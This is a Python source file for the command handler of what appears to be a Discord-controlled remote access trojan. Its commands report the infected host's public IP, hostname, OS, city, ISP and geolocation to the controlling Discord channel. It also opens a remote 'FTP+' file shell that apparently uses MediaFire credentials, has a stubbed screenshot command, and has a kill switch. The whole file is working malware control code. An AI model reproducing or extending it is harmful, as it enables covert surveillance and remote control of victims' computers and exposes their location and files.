from shell.helpMenu import Menu as HelpMenu
from shell.ftpShell import FTPShell
from shell.tools import *
from flag import flag
import discord

class DCShell:
    def __init__(self, bot, mediafireEmail:str=None, mediafirePassword:str=None) -> None:
        self.hMenu = HelpMenu()
        self.myIp = get_ip()
        self.bot = bot
        self.mediafireEmail = {"email": mediafireEmail, "password": mediafirePassword}
        self.ftp = FTPShell(self, "@" in str(mediafireEmail))

    async def process(self, message) -> None:
        cmd = message.content.split(" ")
        cmd[0] == cmd[0].lower()
        if self.ftp.active and cmd[0] not in ["check", "author", "ip", "ipconfig", "ipinfo", "viewip", "showip", "info", "geolocate", "geolocation", "infomenu", "screen", "view", "ss", "screenshare", "screenshot"]:
            return await self.ftp.process(message, cmd)
        if cmd[0] == "ping":
            await message.reply("**Pong!** ("+str(round(self.bot.latency*1000))+"ms)")
        elif cmd[0] == "check":
            await message.channel.send("checked")
        elif cmd[0] == "help":
            if len(cmd) > 1:
                await message.reply(embed=self.hMenu.displayForCommand(cmd[1]))
            else:
                await message.reply(embed=self.hMenu.display())
        elif cmd[0] in ["ip", "ipconfig", "ipinfo", "viewip", "showip"]:
            await message.reply("This is my public IP: "+self.myIp)
        elif cmd[0] in ["info", "geolocate", "geolocation", "infomenu"]:
            info = get_information()
            await message.reply(embed=discord.Embed(
                title="📍 Info Menu 📍",
                description="📰 **HostName:** "+info["hostname"]+"\n🖥️ **OS:** "+info["os"]+"\n🌐 **IPv4:** "+info['ip']+"\n"+flag(info['country'])+" **Country:** "+info['country']+"\n🏠 **City:** "+info['city']+"\n📡 **ISP:** "+info['org']+"\n🗺️ **GeoLocation:** "+info['loc'],
                color=discord.Color.from_rgb(15, 232, 240)
            ))
        elif cmd[0] in ["ftp", "ftp+", "ftpshell", "shellftp"]:
            self.ftp.active = True
            await message.reply("**Welcome to the FTP+ shell!**\n> `help` for a list of commands")
        elif cmd[0] in ["screen", "view", "ss", "screenshare", "screenshot"]: # TODO
            pass
        elif cmd[0] in ["kill", "stop"]:
            await message.reply("Killing this shell...")
            exit()
        elif cmd[0] == "author":
            await message.reply(embed=self.hMenu.authorInfo())
        else:
            await message.reply("**Invalid Command**")